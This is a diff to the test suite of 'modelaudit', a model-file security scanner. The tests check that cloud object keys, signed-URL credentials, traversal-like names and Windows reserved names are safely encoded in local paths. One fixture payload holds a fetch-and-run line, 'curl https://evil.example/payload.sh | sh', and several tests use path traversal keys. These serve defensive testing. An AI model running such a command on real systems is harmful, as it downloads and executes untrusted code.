@@ -2,6 +2,7 @@ import asyncio
 import io
 import json
 import logging
+import ntpath
 import os
 import stat
 import struct
@@ -20,6 +21,7 @@ from modelaudit.scanner_selection import (
     selected_scanner_extensions,
     selected_scanner_filenames,
 )
+from modelaudit.scanners.manifest_scanner import ManifestScanner
 from modelaudit.utils.file.detection import (
     _XML_MODEL_SIGNATURE_READ_BYTES,
     JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES,
@@ -30,6 +32,8 @@ from modelaudit.utils.sources.cloud_storage import (
     _CLOUD_CONTENT_SNIFF_BYTES,
     GCSCache,
     _build_safe_local_path,
+    _cloud_object_prefix_conflicts,
+    _cloud_probe_basename,
     _CloudContentSniffBudget,
     _filter_scannable_cloud_files,
     _run_coroutine_sync,
@@ -1446,6 +1450,91 @@ def test_filter_scannable_cloud_files_matches_local_skip_filter_routes(
     assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]
 
 
+def test_filter_scannable_cloud_files_uses_credential_free_probe_name_for_signed_url() -> None:
+    url = "s3://bucket/models/torch7.jpg?X-Amz-Credential=secret&X-Amz-Signature=signature#access_token=fragment-secret"
+    payload = (
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "torch7.jpg", "size": len(payload), "human_size": f"{len(payload)} B"}]
+    probe_names: list[str] = []
+
+    from modelaudit.utils.file.detection import detect_file_format_for_skip_filter
+
+    def capture_probe_name(path: str) -> str:
+        probe_names.append(Path(path).name)
+        return detect_file_format_for_skip_filter(path)
+
+    with patch(
+        "modelaudit.utils.file.detection.detect_file_format_for_skip_filter",
+        side_effect=capture_probe_name,
+    ):
+        assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "torch7"}]
+
+    assert probe_names == ["cloud-object"]
+
+
+@pytest.mark.parametrize(
+    ("url", "expected"),
+    [
+        pytest.param(
+            "s3://bucket/models/hidden.payload?X-Amz-Signature=secret#access_token=fragment-secret",
+            "cloud-object",
+            id="signed-native-url",
+        ),
+        pytest.param(
+            "https://bucket.example/models/hidden.payload?X-Amz-Signature=secret#access_token=fragment-secret",
+            "cloud-object.payload",
+            id="signed-https-url",
+        ),
+        pytest.param(
+            "s3://bucket/models/hidden?token=secret.pkl#fragment-secret",
+            "cloud-object",
+            id="credential-suffix-only-in-query",
+        ),
+        pytest.param(
+            "s3://bucket/models/hidden?literal-key-part.py",
+            "cloud-object.py",
+            id="native-key-suffix-after-delimiter",
+        ),
+        pytest.param(
+            "s3://bucket/models/hidden.payload%3FX-Amz-Signature%3Dsecret",
+            "cloud-object",
+            id="encoded-query-in-path",
+        ),
+    ],
+)
+def test_cloud_probe_basename_excludes_query_and_fragment_material(url: str, expected: str) -> None:
+    basename = _cloud_probe_basename(url)
+
+    assert basename == expected
+    assert not any(character in basename for character in '<>:"/\\|?*')
+    assert "secret" not in basename
+
+
+def test_filter_scannable_cloud_files_preserves_native_key_delimiter_content_route() -> None:
+    url = "s3://bucket/models/hidden.py?literal-object-key-part"
+    payload = make_flax_msgpack_payload()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "hidden.py?literal-object-key-part", "size": len(payload)}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "flax_msgpack"}]
+
+
+def test_filter_scannable_cloud_files_preserves_native_suffix_after_key_delimiter() -> None:
+    url = "s3://bucket/models/hidden?literal-object-key-part.py"
+    payload = make_flax_msgpack_payload()
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+    files = [{"path": url, "name": "hidden?literal-object-key-part.py", "size": len(payload)}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == []
+
+
 @pytest.mark.parametrize("reported_size", [0, 1])
 def test_filter_scannable_cloud_files_ignores_underreported_size(reported_size: int) -> None:
     url = "s3://bucket/models/model.payload"
@@ -2425,6 +2514,47 @@ def test_download_from_cloud_preserves_normalized_directory_hierarchy(
     fs.get.assert_called_once_with(model_url, str(tmp_path / "nested" / "model.pkl"))
 
 
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_separates_object_from_same_name_prefix(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+) -> None:
+    base_url = "s3://bucket/models"
+    leaf_url = f"{base_url}/a.pkl"
+    descendant_url = f"{base_url}/a.pkl/b.pkl"
+    fs = make_fs_mock()
+    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 2,
+        "total_size": 8,
+        "human_size": "8 B",
+        "estimated_time": "instant",
+        "files": [
+            {"path": leaf_url, "name": "a.pkl", "size": 4, "human_size": "4 B"},
+            {"path": descendant_url, "name": "b.pkl", "size": 4, "human_size": "4 B"},
+        ],
+    }
+
+    result = download_from_cloud(
+        base_url,
+        cache_dir=tmp_path,
+        use_cache=False,
+        selective=False,
+        show_progress=False,
+    )
+
+    destinations = {call.args[0]: Path(call.args[1]) for call in fs.get.call_args_list}
+    assert result == tmp_path
+    assert destinations[leaf_url] == tmp_path / "a.pkl"
+    assert destinations[descendant_url].name == "b.pkl"
+    assert destinations[descendant_url].parent.name.startswith("a.pkl~")
+    assert all(path.read_bytes() == b"data" for path in destinations.values())
+
+
 @patch("fsspec.filesystem")
 def test_download_from_cloud_reuses_cache_with_matching_etag(mock_fs: MagicMock, tmp_path: Path) -> None:
     url = "s3://bucket/model.pt"
@@ -2690,7 +2820,37 @@ def test_download_from_cloud_preserves_native_query_text_in_local_path(
     result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)
 
     assert isinstance(result, Path)
-    assert result.name == "model?variant.bin"
+    assert result.name.startswith("model%3Fvariant~")
+    assert result.suffix == ".bin"
+    assert not any(character in result.name for character in '<>:"/\\|?*')
+    fs.get.assert_called_once_with(url, str(result))
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
+@patch("fsspec.filesystem")
+def test_download_from_cloud_omits_https_credentials_from_local_path(
+    mock_fs: MagicMock, mock_disk_space: MagicMock, mock_analyze: AsyncMock, tmp_path: Path
+) -> None:
+    url = "https://bucket.s3.amazonaws.com/model.bin?X-Amz-Signature=secret#access_token=fragment-secret"
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "file", "size": 1024}
+    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")
+    mock_fs.return_value = fs
+    mock_analyze.return_value = {
+        "type": "file",
+        "size": 1024,
+        "name": "model.bin",
+        "human_size": "1.0 KB",
+        "estimated_time": "1 second",
+    }
+    mock_disk_space.return_value = (True, "")
+
+    result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)
+
+    assert result == tmp_path / "model.bin"
+    assert "secret" not in str(result)
+    assert "access_token" not in str(result)
     fs.get.assert_called_once_with(url, str(result))
 
 
@@ -2715,9 +2875,15 @@ def test_build_safe_local_path_preserves_literal_object_delimiters(tmp_path: Pat
     question_path = _build_safe_local_path(base_url, f"{base_url}/model?one.pkl", tmp_path)
     fragment_path = _build_safe_local_path(base_url, f"{base_url}/model#two.pkl", tmp_path)
 
-    assert question_path == tmp_path / "model?one.pkl"
-    assert fragment_path == tmp_path / "model#two.pkl"
+    assert question_path.parent == tmp_path
+    assert fragment_path.parent == tmp_path
+    assert question_path.name.startswith("model%3Fone~")
+    assert fragment_path.name.startswith("model%23two~")
+    assert question_path.suffix == ".pkl"
+    assert fragment_path.suffix == ".pkl"
     assert question_path != fragment_path
+    assert not any(character in question_path.name for character in '<>:"/\\|?*')
+    assert not any(character in fragment_path.name for character in '<>:"/\\|?*')
 
 
 def test_build_safe_local_path_preserves_sensitive_looking_native_key_text(tmp_path: Path) -> None:
@@ -2725,9 +2891,216 @@ def test_build_safe_local_path_preserves_sensitive_looking_native_key_text(tmp_p
     first = _build_safe_local_path(base_url, f"{base_url}/model.pkl?X-Amz-Signature=one", tmp_path)
     second = _build_safe_local_path(base_url, f"{base_url}/model.pkl?X-Amz-Signature=two", tmp_path)
 
-    assert first == tmp_path / "model.pkl?X-Amz-Signature=one"
-    assert second == tmp_path / "model.pkl?X-Amz-Signature=two"
+    assert first.name.startswith("model.pkl%3FX-Amz-Signature=one~")
+    assert second.name.startswith("model.pkl%3FX-Amz-Signature=two~")
     assert first != second
+
+
+def test_build_safe_local_path_distinguishes_literal_and_encoded_native_key_text(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    literal = _build_safe_local_path(base_url, f"{base_url}/model?variant.pkl", tmp_path)
+    encoded = _build_safe_local_path(base_url, f"{base_url}/model%3Fvariant.pkl", tmp_path)
+
+    assert "%3F" in literal.name
+    assert "%253F" in encoded.name
+    assert literal != encoded
+
+
+def test_build_safe_local_path_distinguishes_empty_native_key_components(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    ordinary = _build_safe_local_path(base_url, f"{base_url}/a/model.pkl", tmp_path)
+    empty_component = _build_safe_local_path(base_url, f"{base_url}/a//model.pkl", tmp_path)
+
+    assert ordinary == tmp_path / "a" / "model.pkl"
+    assert empty_component != ordinary
+    assert empty_component.name == "model.pkl"
+    assert empty_component.parent.name.startswith("~")
+
+
+def test_build_safe_local_path_encodes_native_colon_component(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    local_path = _build_safe_local_path(base_url, f"{base_url}/x:y/model.pkl", tmp_path)
+
+    assert local_path.name == "model.pkl"
+    assert local_path.parent.name.startswith("x%3Ay~")
+    assert ":" not in str(local_path.relative_to(tmp_path))
+
+
+@pytest.mark.parametrize("key", ["../evil.pkl", r"..\evil.pkl"])
+def test_build_safe_local_path_encodes_traversal_like_object_key_text(tmp_path: Path, key: str) -> None:
+    base_url = "s3://bucket/models"
+
+    local_path = _build_safe_local_path(base_url, f"{base_url}/{key}", tmp_path)
+
+    assert local_path.is_relative_to(tmp_path)
+    assert ".." not in local_path.relative_to(tmp_path).parts
+    assert local_path.name.endswith(".pkl")
+
+
+def test_build_safe_local_path_separates_leaf_from_object_prefix(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+    leaf_url = f"{base_url}/a.pkl"
+    descendant_url = f"{base_url}/a.pkl/b.pkl"
+    conflicts = _cloud_object_prefix_conflicts(base_url, [leaf_url, descendant_url])
+
+    leaf = _build_safe_local_path(base_url, leaf_url, tmp_path, object_prefix_conflicts=conflicts)
+    descendant = _build_safe_local_path(base_url, descendant_url, tmp_path, object_prefix_conflicts=conflicts)
+
+    assert conflicts == frozenset({"a.pkl"})
+    assert leaf == tmp_path / "a.pkl"
+    assert descendant.name == "b.pkl"
+    assert descendant.parent.name.startswith("a.pkl~")
+    assert leaf not in descendant.parents
+
+
+def test_build_safe_local_path_preserves_framework_directory_names_without_leaf_conflicts(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+    file_urls = [
+        f"{base_url}/saved_model.pb",
+        f"{base_url}/assets/payload.py",
+        f"{base_url}/variables/variables.index",
+    ]
+    conflicts = _cloud_object_prefix_conflicts(base_url, file_urls)
+
+    local_paths = [
+        _build_safe_local_path(base_url, file_url, tmp_path, object_prefix_conflicts=conflicts)
+        for file_url in file_urls
+    ]
+
+    assert conflicts == frozenset()
+    assert local_paths == [
+        tmp_path / "saved_model.pb",
+        tmp_path / "assets" / "payload.py",
+        tmp_path / "variables" / "variables.index",
+    ]
+
+
+@pytest.mark.parametrize(
+    "file_url",
+    ["s3://other/private/model.pkl", "s3://bucket/elsewhere/model.pkl"],
+)
+def test_build_safe_local_path_rejects_absolute_object_outside_requested_target(
+    tmp_path: Path,
+    file_url: str,
+) -> None:
+    with pytest.raises(ValueError, match="outside requested target"):
+        _build_safe_local_path("s3://bucket/models", file_url, tmp_path)
+
+
+def test_build_safe_local_path_distinguishes_native_keys_on_case_insensitive_filesystems(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    lower = _build_safe_local_path(base_url, f"{base_url}/model?variant.pkl", tmp_path)
+    upper = _build_safe_local_path(base_url, f"{base_url}/model?Variant.pkl", tmp_path)
+
+    assert ntpath.normcase(lower.name) != ntpath.normcase(upper.name)
+
+
+def test_build_safe_local_path_distinguishes_safe_case_only_native_keys(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    lower = _build_safe_local_path(base_url, f"{base_url}/model.pkl", tmp_path)
+    upper = _build_safe_local_path(base_url, f"{base_url}/Model.pkl", tmp_path)
+
+    assert lower == tmp_path / "model.pkl"
+    assert upper.name == "Model.pkl"
+    assert upper.parent.parent == tmp_path
+    assert upper.parent.name.startswith("~")
+    assert ntpath.normcase(str(lower.relative_to(tmp_path))) != ntpath.normcase(str(upper.relative_to(tmp_path)))
+
+
+def test_build_safe_local_path_reserves_generated_identity_namespace(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    transformed = _build_safe_local_path(base_url, f"{base_url}/Model.pkl", tmp_path)
+    generated_identity = transformed.parent.name.removeprefix("~")
+    crafted = _build_safe_local_path(base_url, f"{base_url}/model~{generated_identity}.pkl", tmp_path)
+
+    assert crafted.name == f"model~{generated_identity}.pkl"
+    assert crafted.parent.name.startswith("~")
+    assert crafted.parent != transformed.parent
+    assert ntpath.normcase(str(transformed.relative_to(tmp_path))) != ntpath.normcase(
+        str(crafted.relative_to(tmp_path))
+    )
+
+
+def test_build_safe_local_path_preserves_manifest_basename_and_scanning(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+    local_path = _build_safe_local_path(base_url, f"{base_url}/Model.json", tmp_path)
+    local_path.parent.mkdir(parents=True)
+    local_path.write_text(json.dumps({"model_name": "blocked-model"}), encoding="utf-8")
+
+    assert local_path.name == "Model.json"
+    assert local_path.parent.name.startswith("~")
+    assert ManifestScanner.can_handle(str(local_path)) is True
+
+    result = ManifestScanner(config={"blacklist_patterns": ["blocked"]}).scan(str(local_path))
+
+    assert any(check.status.value == "failed" for check in result.checks)
+    assert any("Blacklisted term" in issue.message for issue in result.issues)
+
+
+def test_build_safe_local_path_bounds_encoded_native_components(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+    shared_prefix = "%?" * 50
+
+    first = _build_safe_local_path(base_url, f"{base_url}/{shared_prefix}one.pkl", tmp_path)
+    second = _build_safe_local_path(base_url, f"{base_url}/{shared_prefix}two.pkl", tmp_path)
+
+    assert len(first.name.encode("utf-8")) <= 240
+    assert len(second.name.encode("utf-8")) <= 240
+    assert first.suffix == ".pkl"
+    assert second.suffix == ".pkl"
+    assert first != second
+
+
+def test_build_safe_local_path_preserves_windows_safe_name(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    assert _build_safe_local_path(base_url, f"{base_url}/model.pkl", tmp_path) == tmp_path / "model.pkl"
+
+
+def test_build_safe_local_path_encodes_windows_reserved_name(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    local_path = _build_safe_local_path(base_url, f"{base_url}/CON.pkl", tmp_path)
+
+    assert local_path.parent == tmp_path
+    assert local_path.name.startswith("%43ON~")
+    assert local_path.suffix == ".pkl"
+    assert local_path.stem.casefold() != "con"
+
+
+@pytest.mark.parametrize(
+    "reserved_name",
+    ["conin$.pkl", "conout$.pkl", "COM\u00b9", "COM\u00b2.txt", "LPT\u00b3.pkl", "aux .txt"],
+)
+def test_build_safe_local_path_encodes_windows_console_device_name(
+    tmp_path: Path,
+    reserved_name: str,
+) -> None:
+    base_url = "s3://bucket/models"
+
+    local_path = _build_safe_local_path(base_url, f"{base_url}/{reserved_name}", tmp_path)
+
+    assert local_path.parent == tmp_path
+    assert local_path.name != reserved_name
+    assert local_path.name.startswith("%")
+
+
+def test_build_safe_local_path_encodes_unpaired_surrogate(tmp_path: Path) -> None:
+    base_url = "s3://bucket/models"
+
+    local_path = _build_safe_local_path(base_url, f"{base_url}/bad\ud800.pkl", tmp_path)
+    local_path.write_bytes(b"model")
+
+    assert local_path.read_bytes() == b"model"
+    assert "\ud800" not in local_path.name
+    assert local_path.name.startswith("bad%ED%A0%80~")
+    assert local_path.suffix == ".pkl"
 
 
 @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@@ -3437,7 +3810,7 @@ class TestCloudPathSecurity:
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
     @patch("fsspec.filesystem")
-    def test_download_rejects_path_traversal(
+    def test_download_encodes_dot_components_as_object_key_text(
         self,
         mock_fs_class: MagicMock,
         mock_analyze: AsyncMock,
@@ -3445,6 +3818,7 @@ class TestCloudPathSecurity:
     ) -> None:
         fs = make_fs_mock()
         fs.info.return_value = {}
+        fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")
         mock_fs_class.return_value = fs
 
         mock_analyze.return_value = {
@@ -3463,16 +3837,19 @@ class TestCloudPathSecurity:
             ],
         }
 
-        with pytest.raises(ValueError, match="Path traversal attempt detected"):
-            download_from_cloud(
-                "s3://bucket/models",
-                cache_dir=tmp_path,
-                use_cache=False,
-                selective=False,
-                show_progress=False,
-            )
+        result = download_from_cloud(
+            "s3://bucket/models",
+            cache_dir=tmp_path,
+            use_cache=False,
+            selective=False,
+            show_progress=False,
+        )
 
-        fs.get.assert_not_called()
+        destination = Path(fs.get.call_args.args[1])
+        assert result == tmp_path
+        assert destination.is_relative_to(tmp_path)
+        assert ".." not in destination.relative_to(tmp_path).parts
+        assert destination.name == "evil.pkl"
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
     @patch("fsspec.filesystem")
@@ -3747,7 +4124,7 @@ class TestCloudPathSecurity:
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
     @patch("fsspec.filesystem")
-    def test_streaming_download_rejects_path_traversal(
+    def test_streaming_download_encodes_dot_components_as_object_key_text(
         self,
         mock_fs_class: MagicMock,
         mock_analyze: AsyncMock,
@@ -3771,16 +4148,18 @@ class TestCloudPathSecurity:
             ],
         }
 
-        with pytest.raises(ValueError, match="Path traversal attempt detected"):
-            list(
-                download_from_cloud_streaming(
-                    "s3://bucket/models",
-                    show_progress=False,
-                    selective=False,
-                )
+        downloads = list(
+            download_from_cloud_streaming(
+                "s3://bucket/models",
+                show_progress=False,
+                selective=False,
             )
+        )
 
-        fs.get.assert_not_called()
+        destination = Path(fs.get.call_args.args[1])
+        assert len(downloads) == 1
+        assert ".." not in destination.parts
+        assert destination.name == "evil.pkl"
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
     @patch("fsspec.filesystem")
